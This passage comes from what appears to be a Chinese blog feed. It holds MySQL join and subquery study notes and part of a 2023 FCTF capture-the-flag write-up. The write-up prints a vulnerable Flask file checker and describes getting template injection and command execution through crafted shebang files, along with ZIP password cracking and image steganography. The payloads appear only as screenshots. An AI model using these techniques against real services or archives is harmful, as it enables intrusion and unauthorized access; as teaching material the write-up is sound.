class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询员工的上级领导、要求显示员工名和对应的领导名<br>select empno,ename,mgr from emp;<br>+-------+--------+------+<br>| empno | ename  | mgr  |<br>+-------+--------+------+<br>|  7369 | SMITH  | 7902 |<br>|  7499 | ALLEN  | 7698 |<br>|  7521 | WARD   | 7698 |<br>|  7566 | JONES  | 7839 |<br>|  7654 | MARTIN | 7698 |<br>|  7698 | BLAKE  | 7839 |<br>|  7782 | CLARK  | 7839 |<br>|  7788 | SCOTT  | 7566 |<br>|  7839 | KING   | NULL |<br>|  7844 | TURNER | 7698 |<br>|  7876 | ADAMS  | 7788 |<br>|  7900 | JAMES  | 7698 |<br>|  7902 | FORD   | 7566 |<br>|  7934 | MILLER | 7782 |<br>+-------+--------+------+<br>select a.ename as &#x27;员工&#x27;,b.ename as &#x27;领导&#x27; from emp as a join emp as b on a.mgr=b.empno;<br>+--------+-------+<br>| 员工   | 领导  |<br>+--------+-------+<br>| SMITH  | FORD  |<br>| ALLEN  | BLAKE |<br>| WARD   | BLAKE |<br>| JONES  | KING  |<br>| MARTIN | BLAKE |<br>| BLAKE  | KING  |<br>| CLARK  | KING  |<br>| SCOTT  | JONES |<br>| TURNER | BLAKE |<br>| ADAMS  | SCOTT |<br>| JAMES  | BLAKE |<br>| FORD   | JONES |<br>| MILLER | CLARK |<br>+--------+-------+<br>#自连接的技巧：一张表看做两张表，员工的领导编号等于领导的员工编号<br>#KING没有上级<br></code></pre></td></tr></table></figure><p>外连接：</p><p>查询员工表可以发现员工表中有10、20、30部门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from emp;<br>+-------+--------+-----------+------+------------+---------+---------+--------+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+-------+--------+-----------+------+------------+---------+---------+--------+<br>|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>+-------+--------+-----------+------+------------+---------+---------+--------+<br></code></pre></td></tr></table></figure><p>查询部门表发现除了10&#x2F;20&#x2F;30部门还有40部门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from dept;<br>+--------+------------+----------+<br>| DEPTNO | DNAME      | LOC      |<br>+--------+------------+----------+<br>|     10 | ACCOUNTING | NEW YORK |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |<br>+--------+------------+----------+<br></code></pre></td></tr></table></figure><p>如果希望将除了员工表里有的部门输出外，同时输出员工表中没有的部门，就要用到外连接了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select e.ename,d.dname from emp e right join dept d on e.deptno = d.deptno;#right表示将join关键字右边的这张表看做主表，主要是为了将这张表的数据全部查询出来，捎带着关联查询左边的表<br>#同内连接一样，join前面有个可省可不省的outer<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| SMITH  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| WARD   | SALES      |<br>| JONES  | RESEARCH   |<br>| MARTIN | SALES      |<br>| BLAKE  | SALES      |<br>| CLARK  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| KING   | ACCOUNTING |<br>| TURNER | SALES      |<br>| ADAMS  | RESEARCH   |<br>| JAMES  | SALES      |<br>| FORD   | RESEARCH   |<br>| MILLER | ACCOUNTING |<br>| NULL   | OPERATIONS |<br>+--------+------------+<br>#除了14个员工对应的部门外，还有一个匹配不上的OPERATIONS部门也显示出来了，对应的员工为空<br></code></pre></td></tr></table></figure><p>举一反三一下很容易得出左连接的写法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select e.ename,d.dname from dept d left join emp e on e.deptno = d.deptno;#记得把join两侧表名换位置<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| SMITH  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| WARD   | SALES      |<br>| JONES  | RESEARCH   |<br>| MARTIN | SALES      |<br>| BLAKE  | SALES      |<br>| CLARK  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| KING   | ACCOUNTING |<br>| TURNER | SALES      |<br>| ADAMS  | RESEARCH   |<br>| JAMES  | SALES      |<br>| FORD   | RESEARCH   |<br>| MILLER | ACCOUNTING |<br>| NULL   | OPERATIONS |<br>+--------+------------+<br></code></pre></td></tr></table></figure><p><strong>外连接查询结果条数大于等于内连接</strong></p><p>同样是上面员工领导的问题，使用外连接，可将显示所有员工的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select a.ename as &#x27;员工&#x27;,b.ename as &#x27;领导&#x27; from emp as a left join emp as b on a.mgr = b.empno;<br>+--------+-------+<br>| 员工   | 领导  |<br>+--------+-------+<br>| SMITH  | FORD  |<br>| ALLEN  | BLAKE |<br>| WARD   | BLAKE |<br>| JONES  | KING  |<br>| MARTIN | BLAKE |<br>| BLAKE  | KING  |<br>| CLARK  | KING  |<br>| SCOTT  | JONES |<br>| KING   | NULL  |#KING显示<br>| TURNER | BLAKE |<br>| ADAMS  | SCOTT |<br>| JAMES  | BLAKE |<br>| FORD   | JONES |<br>| MILLER | CLARK |<br>+--------+-------+<br></code></pre></td></tr></table></figure><p><strong>总结：内连接取交集，外连接取并集</strong></p><p>多张表连接：</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT<br>...<br>FROM<br>A<br>JOIN<br>B<br>ON<br>f(A,B)<br>JOIN<br>C<br>ON<br>g(A,C)<br>JOIN<br>D<br>ON<br>h(A,B)<br>#内连接外连接可以混合<br></code></pre></td></tr></table></figure><p><strong>子查询：</strong></p><p>select语句的嵌套</p><p>where中的子查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal from emp where sal &gt; min(sal);#这句语句是错误的，shiyong max()前未分组<br>select ename,sal from emp where sal &gt; (select min(sal) from emp);<br>+--------+---------+<br>| ename  | sal     |<br>+--------+---------+<br>| ALLEN  | 1600.00 |<br>| WARD   | 1250.00 |<br>| JONES  | 2975.00 |<br>| MARTIN | 1250.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| SCOTT  | 3000.00 |<br>| KING   | 5000.00 |<br>| TURNER | 1500.00 |<br>| ADAMS  | 1100.00 |<br>| JAMES  |  950.00 |<br>| FORD   | 3000.00 |<br>| MILLER | 1300.00 |<br>+--------+---------+<br></code></pre></td></tr></table></figure><p>from中的子查询：</p><p>注：from后面的子查询可以将子查询的查询结果当做一张临时表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg:找出每个岗位的平均工资的薪资等级<br>#第一步：找出每个岗位的平均工资（按岗位分组）<br>select job,avg(sal) from emp group by job;<br>+-----------+-------------+<br>| job       | avg(sal)    |<br>+-----------+-------------+<br>| ANALYST   | 3000.000000 |<br>| CLERK     | 1037.500000 |<br>| MANAGER   | 2758.333333 |<br>| PRESIDENT | 5000.000000 |<br>| SALESMAN  | 1400.000000 |<br>+-----------+-------------+#现在就将左表看做是一张临时表<br>#第二步：将以上查询结果当做一张真实存在的表t<br>select * from salgrade;#查薪资等级<br>+-------+-------+-------+<br>| GRADE | LOSAL | HISAL |<br>+-------+-------+-------+<br>|     1 |   700 |  1200 |<br>|     2 |  1201 |  1400 |<br>|     3 |  1401 |  2000 |<br>|     4 |  2001 |  3000 |<br>|     5 |  3001 |  9999 |<br>+-------+-------+-------+#起别名s<br>#将t表和s表进行表连接，连接条件是t.avg(sal) between s.losal and s.hisal<br>select t.job,s.grade from (select job,avg(sal) from emp group by job) as t join salgrade as s on t.avg(sal) between s.losal and s.hisal;<br>#执行以上命令出现报错：<br>#ERROR 1630 (42000): FUNCTION t.avg does not exist. Check the &#x27;Function Name Parsing and Resolution&#x27; section in the Reference Manual<br>#原因是on后面的t.avg(sal)被认为是分组函数，外层select未进行分组<br>#修改方法：起别名<br>select t.job,s.grade from (select job,avg(sal) as avg from emp group by job) as t join salgrade as s on t.avg between s.losal and s.hisal;<br>+-----------+-------+<br>| job       | grade |<br>+-----------+-------+<br>| ANALYST   |     4 |<br>| CLERK     |     1 |<br>| MANAGER   |     4 |<br>| PRESIDENT |     5 |<br>| SALESMAN  |     2 |<br>+-----------+-------+<br></code></pre></td></tr></table></figure><p><strong>联合查询(UNION)：</strong></p><p>合并查询结果集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,job from emp where job = &#x27;MANAGER&#x27;;<br>+-------+---------+<br>| ename | job     |<br>+-------+---------+<br>| JONES | MANAGER |<br>| BLAKE | MANAGER |<br>| CLARK | MANAGER |<br>+-------+---------+<br>select ename,job from emp where job = &#x27;SALESMAN&#x27;;<br>+--------+----------+<br>| ename  | job      |<br>+--------+----------+<br>| ALLEN  | SALESMAN |<br>| WARD   | SALESMAN |<br>| MARTIN | SALESMAN |<br>| TURNER | SALESMAN |<br>+--------+----------+<br>select ename,job from emp where job = &#x27;MANAGER&#x27; union select ename,job from emp where job = &#x27;SALESMAN&#x27;;<br>+--------+----------+<br>| ename  | job      |<br>+--------+----------+<br>| JONES  | MANAGER  |<br>| BLAKE  | MANAGER  |<br>| CLARK  | MANAGER  |<br>| ALLEN  | SALESMAN |<br>| WARD   | SALESMAN |<br>| MARTIN | SALESMAN |<br>| TURNER | SALESMAN |<br>+--------+----------+<br></code></pre></td></tr></table></figure><p><strong>注意：union联合查询的两个结果要求列的数目以及数据类型相同</strong></p><p><strong>limit：</strong></p><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><p><code>&lt;!DOCTYPE html&gt;</code>是H5的声明位于文档的最前面，处于标签之前。他是网页必备的组成部分，避免浏览器的怪异模式。</p><p><code>meta</code>标签用于描述一个HTML网页文档的属性，关键词等，eg：<code>&lt;meta charset=&#39;UTF-8&#39;&gt;</code>，是单标签</p><p>生成<code>&lt;h1&gt;</code>到<code>&lt;h6&gt;</code>快捷键：<code>h$*6</code></p><p>align属性，调整标题摆放位置</p><p><code>&lt;h1 align=&#39;left|right|center&#39;&gt;居左，右，中，默认居左&lt;/h1&gt;&gt;</code></p><p>段落通过<code>&lt;p&gt;</code>标签定义<code>&lt;p&gt;这是一个段落&lt;/p&gt;</code></p><p><code>&lt;p&gt;这是一个可以换&lt;br&gt;行的标签&lt;/p&gt;</code></p><p><code>&lt;hr/&gt;</code>标签在html页面中创建水平线，<code>&lt;hr color=&quot;&quot; width=&quot;&quot; size=&quot;&quot; aligh=&quot;&quot; /&gt;</code></p><ul><li>color：颜色</li><li>width：长度</li><li>size：水平线高度</li><li>align：对齐方式，默认居中</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023FCTF</title>
    <link href="/2023/04/27/FCTF/"/>
    <url>/2023/04/27/FCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023FCTF"><a href="#2023FCTF" class="headerlink" title="2023FCTF"></a>2023FCTF</h1><h2 id="热身赛"><a href="#热身赛" class="headerlink" title="热身赛"></a>热身赛</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ViewSource"><a href="#ViewSource" class="headerlink" title="ViewSource"></a>ViewSource</h4><p>一道简单的前端题，根据提示ViewSource，<code>ctrl+u</code>查看源代码，这里网页代码被加密过了，直接往下看发现可疑段落</p><p><img src="/2023/04/27/FCTF/image-20230427005335078.png"></p><p>分析逻辑，用户输入<code>your_flag</code>，如果<code>your_flag</code>与<code>my_flag</code>相同，则弹窗<code>my_flag</code></p><p>提供两种做法</p><p>既然<code>my_flag</code>变量在js代码中定义，那么我们就能用控制台把它输出</p><p><img src="/2023/04/27/FCTF/image-20230427010136529.png"></p><p><code>ctrl+s</code>保存网页源代码用编辑器打开</p><p><img src="/2023/04/27/FCTF/image-20230427010344248.png"></p><p>修改代码逻辑，如果用户输入的<code>your_flag</code>与实际flag不相等则弹窗<code>my_flag</code>，保存，打开html文件往输入框里随便输个什么提交</p><p><img src="/2023/04/27/FCTF/image-20230427010548568.png"></p><hr><h4 id="javaDeserialize-1"><a href="#javaDeserialize-1" class="headerlink" title="javaDeserialize-1"></a>javaDeserialize-1</h4><p><img src="/2023/04/27/FCTF/image-20230429201037517.png"></p><p>点开题目，</p><hr><h4 id="javaDeserialize-2"><a href="#javaDeserialize-2" class="headerlink" title="javaDeserialize-2"></a>javaDeserialize-2</h4><hr><h4 id="filechecker-mini"><a href="#filechecker-mini" class="headerlink" title="filechecker_mini"></a>filechecker_mini</h4><p>打开题目，让我们上传一个文件：</p><p><img src="/2023/04/27/FCTF/image-20230429032204160.png"></p><p>桌面上随便丢了个php文件进去提交看看会有啥情况：</p><p><img src="/2023/04/27/FCTF/image-20230429032353870.png"></p><p>判断文件类型，(MIME绕过预定)</p><p>附件下载下来先看源码：</p><p>index.html：</p><p><img src="/2023/04/27/FCTF/image-20230429030651913.png"></p><p>可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> waitress <span class="hljs-keyword">import</span> serve<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><br>app_dir = os.path.split(os.path.realpath(__file__))[<span class="hljs-number">0</span>]<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app_dir&#125;</span>/upload/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,result=<span class="hljs-string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            f = request.files[<span class="hljs-string">&#x27;file-upload&#x27;</span>]<br>            filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)<br><br>            <span class="hljs-keyword">if</span> os.path.exists(filepath) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-keyword">in</span> filepath:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                f.save(filepath)<br>                file_check_res = subprocess.check_output(<br>                    [<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>                    shell=<span class="hljs-literal">False</span>, <br>                    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>                    timeout=<span class="hljs-number">1</span><br>                )<br>                os.remove(filepath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;empty&quot;</span> <span class="hljs-keyword">in</span> file_check_res <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;cannot open&quot;</span> <span class="hljs-keyword">in</span> file_check_res:<br>                    file_check_res=<span class="hljs-string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span><br>                <span class="hljs-keyword">return</span> render_template_string(file_check_res)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    serve(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>, threads=<span class="hljs-number">1000</span>, cleanup_interval=<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230429032742576.png"></p><p>上面大家都用<code>render_template()</code>就你爱用<code>render_template_string()</code>是吧（指指点点，一眼模板注入，那么我们就希望<code>file_check_res</code>里有我们能够执行的rce代码。<code>file_check_res</code>哪来的？倒退往上看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f.save(filepath)<br>file_check_res = subprocess.check_output(<br>[<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>shell=<span class="hljs-literal">False</span>, <br>encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>imeout=<span class="hljs-number">1</span><br>)<br>os.remove(filepath)<br></code></pre></td></tr></table></figure><p>先保存filepath这样一个文件，<code>subprocess.check_output(command)</code>返回Linux命令行输出，然后再把filepath文件删除，那么这里的<code>file_check_res</code>就是<code>file -b &#123;filepath&#125;</code>的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用<code>file -b</code> 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型，</p><p><img src="/2023/04/27/FCTF/image-20230429034451879.png"></p><p>代码中的-b参数作用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-b 　#列出辨识结果时，不显示文件名称。<br></code></pre></td></tr></table></figure><p>所以在文件名上动手脚的想法也破灭了（悲。</p><p>卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。<img src="/2023/04/27/FCTF/image-20230429191534591.png"></p><p>点开tests里面是各种针对该<code>file</code>命令的<a href="https://github.com/file/file/tree/master/tests">测试结果</a></p><p><img src="/2023/04/27/FCTF/image-20230429191635511.png"></p><p>这8个分别分别是在文本中写入bash脚本的4种情况和对应的用<code>file</code>命令执行的输出结果，可以看出如果文本内容为<code>#!/usr/bin</code>开头的那么输出结果中会显示文本中的其他内容。</p><p><img src="/2023/04/27/FCTF/image-20230429191927593.png"></p><p>本地做测试：创建一个文本文件修改内容如下</p><p><img src="/2023/04/27/FCTF/image-20230429193849800.png"></p><p>测试结果如下：</p><p><img src="/2023/04/27/FCTF/image-20230429193915755.png"></p><p>显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件</p><p><img src="/2023/04/27/FCTF/image-20230429194117415.png"></p><p><img src="/2023/04/27/FCTF/image-20230429194209528.png"></p><p>存在ssti漏洞，开始利用，调用os模块</p><p><img src="/2023/04/27/FCTF/image-20230429195640928.png"></p><p><img src="/2023/04/27/FCTF/image-20230429195803084.png"></p><p>调用popen()方法。</p><p><img src="/2023/04/27/FCTF/image-20230429195958840.png"></p><p>上传文件，获取flag。</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="png"><a href="#png" class="headerlink" title="png"></a>png</h4><p>附件下载下来是一张png图片，</p><p><img src="/2023/04/27/FCTF/image-20230430041531911.png"></p><p>010打开划拉到最底部发现冗余数据，部分flag<code>FCTF&#123;To</code>，</p><p><img src="/2023/04/27/FCTF/image-20230430043203297.png"></p><p>010跑PNGTemplate.bt脚本报错，左下提示CRC不匹配，说明修改了高宽却没有修改CRC导致读取报错，图片宽高很可能被修改过。(或者放入kali中无法打开)</p><p><img src="/2023/04/27/FCTF/image-20230430043711587.png"></p><p>进行一个高度的改，将高度640改为700</p><p><img src="/2023/04/27/FCTF/image-20230430044130507.png"></p><p>文件头数据块IHDR包含的第一部分数据就是图片宽高，分别对应第二行中的第一组四个字节和第二组四个字节，掏出计算器算算高度拉长点。</p><p><img src="/2023/04/27/FCTF/image-20230430044803732.png"></p><p>得到另一部分flag：<code>_the_flawless_</code></p><p><img src="/2023/04/27/FCTF/image-20230430045240866.png"></p><p>然后就是做这道题时比较懵逼的一个地方了，招最后一部分flag。先开起zsteg看看能拿到什么吧。查到了之前找到的<code>FCTF&#123;To</code>，但是愣是没发现最后一部分flag，如果有LSB隐写那zsteg也应该能淦出来才对呀？</p><p><img src="/2023/04/27/FCTF/image-20230430045440795.png"></p><p>由于过于依赖工具，死磕这条路坚信不存在lsb隐写。愣是没用Stegsolve手搓，到处找，查IDAT块、翻EXIF信息…最后还得感谢ixout手搓LSB出来。</p><p><img src="/2023/04/27/FCTF/image-20230430050104649.png"> </p><p>呜呜呜呜呜呜呜呜呜呜。</p><p>最后三段flag拼接起来得到flag。</p><p>呜呜呜呜呜呜呜呜呜呜。</p><h4 id="cet6"><a href="#cet6" class="headerlink" title="cet6"></a>cet6</h4><p>一道基础的USB取证题，但是不太常规。。。</p><h4 id="zip套娃"><a href="#zip套娃" class="headerlink" title="zip套娃"></a>zip套娃</h4><p>第一层：</p><p>binwalk无法分离，不是伪加密。没给其他条件明文攻击也不太行，那就爆破试试吧（。</p><p><img src="/2023/04/27/FCTF/image-20230430051023113.png"></p><p>ARCHPR开起来，攻击方式字典，选的是kali字典。跑了一段时间后成功拿到第一层密码。</p><p><img src="/2023/04/27/FCTF/image-20230430130335839.png"></p><p>第二层：</p><p>依然先丢到kali里binwalk试下，分离成功，伪加密</p><p><img src="/2023/04/27/FCTF/image-20230430142037485.png"></p><p>分离出来的东西多了个0.zip打开其实就是第二层的包不过问题不大，直接看第三层的压缩包</p><p><img src="/2023/04/27/FCTF/image-20230430142135922.png"></p><p>第三层：</p><p>打开压缩包看到了一个支点.txt文件，同时第二层解压出来后也有一个支点.txt，支点.txt文件大小大于12字节，大胆猜测是明文攻击。</p><p><img src="/2023/04/27/FCTF/image-20230430144529014.png"></p><p>WinRAR将泄密出来的文件压缩为zip，开始明文攻击，然后就。。。</p><p><img 